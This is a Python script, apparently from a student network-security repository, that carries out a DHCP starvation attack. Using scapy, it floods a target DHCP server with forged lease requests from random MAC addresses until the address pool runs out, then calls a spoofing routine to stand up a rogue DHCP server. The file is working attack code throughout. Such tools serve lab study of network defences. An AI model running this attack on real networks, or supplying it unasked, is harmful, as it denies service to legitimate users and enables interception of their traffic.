# https://github.com/shamiul94/DHCP-Spoofing-Attack-Network-Security/blob/master/Final-Codes/Request_Starve.py
from Project import *
import ipaddress
from dhcp_spoof import *

req_port = 67
name = "DHCP Starvation"
function_name = "starve"


def starve(values):

    requested_IP = ''
    
    print("Running DHCP starvation:\n")
    valid_var = ["target_ip", "subnet"]
    help_statement = "\nsends a multitude of DHCP queries to attempt to create leases for all available IP addresses"
    variable_input(valid_var, help_statement, values)
    all_variables_inputted(values, valid_var)
    check_var(values, valid_var)
    iface = ipaddress.ip_network(values.get("target_ip") + "/" + values.get("subnet"), strict=False)
    octets = str(iface.network_address).split(".")
    ip_pool_start = int(octets[3]) + 1
    octets = str(iface.broadcast_address).split(".")
    last_ip = int(octets[3]) - ip_pool_start
    subnet = str(iface.network_address).split(".")
    del subnet[-1]
    subnet = ".".join(subnet)
    subnet = subnet + "."

    for i in range(1,last_ip):
        current_ip = (int(ip_pool_start) + int(i))
        requested_IP = subnet + str(current_ip)
        print(requested_IP)

        request_packet = (Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=2048)
                          / IP(src='0.0.0.0', dst='255.255.255.255')
                          / UDP(sport=68, dport=67)
                          / BOOTP(op=1, htype=1, hlen=6, hops=0, xid=176591826, secs=0,
                                  flags=0, ciaddr='0.0.0.0', yiaddr='0.0.0.0',
                                  siaddr='0.0.0.0', giaddr='0.0.0.0',
                                  chaddr=b'\xa4PF|\x12\x91\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                                  sname=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00',
                                  file=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                                  options=b'c\x82Sc')
                          / DHCP(options=[('message-type', 3),
                                          ('client_id', b'\x01\xa4PF|\x12\x91'),
                                          ('requested_addr', requested_IP),
                                          ('server_id', values.get("target_ip")),
                                          ('max_dhcp_size', 1500),
                                          ('param_req_list', [1, 3, 6, 15, 26, 28, 51, 58, 59, 43]), 'end', 'pad']))
        sendp(request_packet, iface=values.get("iface"))
        
    print("Starvation complete") 
    print("Starting spoofing")
    spoofing(values)
